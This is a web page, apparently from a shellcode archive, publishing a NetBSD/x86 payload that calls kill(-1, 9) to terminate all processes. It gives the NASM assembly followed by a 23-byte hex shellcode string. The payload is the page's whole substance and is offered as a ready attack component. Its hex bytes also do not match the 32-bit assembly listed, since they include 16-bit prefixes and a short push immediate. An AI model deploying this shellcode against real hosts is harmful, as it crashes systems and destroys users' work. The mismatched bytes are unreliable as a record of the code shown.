<html><head><title>NetBSD/x86 - kill all processes shellcode - 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
netbsd/x86 kill all processes shellcode
author Anonymous
this shellcode is using syscall number 37 or 0x25
37      STD             { int sys_kill(int pid, int signum); }
here is assembler code using intel syntaxe and NASM
--------------begin-----------
section .note.netbsd.ident
    dd  0x07,0x04,0x01
    db  &quot;NetBSD&quot;,0x00,0x00
    dd  200000000
 section .data
 section .text
    global _start
 _start:
xor eax, eax
push 0x09
mov eax, -1
push eax
xor eax,eax
mov al, 37
push eax
int 0x80
-------------------------end------------
if we dissasemble this code wi will get shellcode
&quot;\x66\x31\xc0\x68\x09\x00\x66\xb8\xff\xff\xff\xff\x66\x50\x66\x31\xc0\xb0\x25\x66\x50\xcd\x80&quot;
*/

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
